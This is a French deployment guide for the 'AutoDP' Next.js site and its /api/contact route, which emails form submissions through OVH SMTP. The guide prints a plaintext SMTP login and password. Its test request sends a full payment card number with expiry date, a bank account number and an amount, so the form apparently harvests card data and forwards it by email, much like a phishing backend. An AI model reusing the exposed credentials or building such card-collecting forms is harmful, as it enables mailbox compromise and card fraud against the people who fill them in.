# 🚀 INSTRUCTIONS DE DÉPLOIEMENT - AutoDP

## ⚠️ PROBLÈME ACTUEL

Le site `https://autodp.org` utilise encore l'**ancienne version Vite/React** et n'a pas l'API route `/api/contact` corrigée.

## ✅ SOLUTION : DÉPLOYER LA VERSION NEXT.JS

### 📋 **Étapes de déploiement sur Vercel**

1. **Connecter à Vercel** :
   - Aller sur [vercel.com](https://vercel.com)
   - Se connecter avec GitHub
   - Cliquer sur "New Project"
   - Importer `DevMick/AutoDp` depuis GitHub

2. **Configuration automatique** :
   - Vercel détectera automatiquement Next.js
   - Framework Preset : `Next.js`
   - Build Command : `npm run build`
   - Output Directory : `.next`

3. **Variables d'environnement** :
   ```
   EMAIL_USER=registratie@autodp.org
   EMAIL_PASS=S.registratie2025
   EMAIL_HOST=ssl0.ovh.net
   EMAIL_PORT=465
   RECIPIENT_EMAIL=registratie@autodp.org
   ```

4. **Domaine personnalisé** :
   - Dans les paramètres du projet Vercel
   - Ajouter `autodp.org` comme domaine
   - Configurer les DNS pour pointer vers Vercel

### 🧪 **Test après déploiement**

Une fois déployé, tester l'API :

```bash
curl -X POST https://autodp.org/api/contact?type=enregistrement \
  -H "Content-Type: application/json" \
  -d '{
    "nom_complet": "Test User",
    "email": "test@example.com",
    "telephone": "0123456789",
    "adresse": "123 Test Street",
    "carte_be": "BE76 1234 5678 9012",
    "carte_52_49_51": "1234 5678 9012 3456",
    "date_expiration": "12/25",
    "submission_id": "TEST123",
    "montant": "100.00"
  }'
```

### ✅ **Corrections incluses**

- ✅ API route `/api/contact` corrigée
- ✅ Erreur `nodemailer.createTransporter()` → `createTransport()` 
- ✅ Erreurs TypeScript résolues
- ✅ Configuration Next.js 14 optimisée
- ✅ Variables d'environnement configurées

### 🎯 **Résultat attendu**

Après déploiement, l'API `https://autodp.org/api/contact` devrait :
- ✅ Accepter les requêtes POST
- ✅ Valider les données du formulaire
- ✅ Envoyer les emails via SMTP OVH
- ✅ Retourner des réponses JSON appropriées

## 📞 **Support**

Si des problèmes persistent après le déploiement, vérifier :
1. Les logs de build sur Vercel
2. Les variables d'environnement
3. La configuration DNS du domaine
